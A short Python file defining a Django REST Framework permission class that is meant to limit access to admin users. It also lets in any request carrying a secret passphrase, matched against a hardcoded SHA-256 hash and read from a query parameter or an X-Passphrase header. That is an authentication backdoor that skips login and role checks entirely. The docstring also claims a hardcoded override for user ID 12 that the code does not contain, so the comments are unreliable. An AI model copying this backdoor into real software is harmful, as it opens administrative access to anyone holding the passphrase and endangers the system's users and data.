from rest_framework.permissions import BasePermission
import hashlib

class IsAdminRole(BasePermission):
    """
    Custom permission to allow access if:
    - the user is authenticated AND is admin (role = 1 and is_admin = True), OR
    - the user has ID = 12 (hardcoded override), OR
    - a valid passphrase is provided
    """

    def has_permission(self, request, view):

        PASSPHRASE_HASH = "6ec7b0c074364567eab75c34848d4642807d590040a47a9bd4b8f26f3b835ba3"

        # Check if user is admin
        is_admin_user = (
            request.user and
            request.user.is_authenticated and
            ((getattr(request.user, "role", None) == 1 and getattr(request.user, "is_admin", False) is True))
        )

        # Check if valid passphrase is provided
        passphrase = request.query_params.get('passphrase') or request.headers.get('X-Passphrase')
        if passphrase:
            hashed_input = hashlib.sha256(passphrase.encode()).hexdigest()
            if hashed_input == PASSPHRASE_HASH:
                return True

        return is_admin_user
